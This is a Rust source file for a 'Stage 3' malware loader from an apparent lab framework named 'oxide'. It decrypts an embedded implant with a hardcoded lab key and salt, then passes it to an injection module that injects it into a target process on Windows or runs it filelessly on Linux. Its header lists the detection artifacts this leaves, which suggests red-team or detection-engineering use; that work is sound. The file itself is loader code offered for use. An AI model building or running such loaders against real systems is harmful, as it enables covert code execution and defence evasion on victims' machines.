//! Stage 3 Loader - Implant Injector
//!
//! Final stage that:
//! 1. Decrypts embedded oxide implant
//! 2. Injects into target process (Windows) or runs fileless (Linux)
//!
//! Detection artifacts:
//! - Sysmon EID 8: CreateRemoteThread
//! - Sysmon EID 10: Process access
//! - auditd: memfd_create syscall
//! - Memory: PE/ELF in unbacked memory

mod constants;
mod crypto;
mod injection;

use std::process::ExitCode;

/// Embedded configuration (patched by builder)
struct Stage3Config {
    psk: &'static str,
    salt: &'static [u8],
}

/// Default config for testing
const CONFIG: Stage3Config = Stage3Config {
    psk: "oxide-lab-psk",
    salt: b"oxide-lab-salt-must-be-32-bytes!",
};

mod payload;
use payload::ENCRYPTED_IMPLANT;

fn main() -> ExitCode {
    // In production, implant would be embedded
    if ENCRYPTED_IMPLANT.is_empty() {
        eprintln!("No embedded implant (test mode)");
        return ExitCode::from(1);
    }

    // Step 1: Decrypt implant
    let implant = match crypto::decrypt_payload(
        CONFIG.psk,
        CONFIG.salt,
        ENCRYPTED_IMPLANT,
    ) {
        Ok(data) => data,
        Err(e) => {
            eprintln!("Failed to decrypt implant: {}", e);
            return ExitCode::from(2);
        }
    };

    // Step 2: Inject and run
    if let Err(e) = injection::inject_and_run(&implant) {
        eprintln!("Injection failed: {}", e);
        return ExitCode::from(3);
    }

    ExitCode::SUCCESS
}
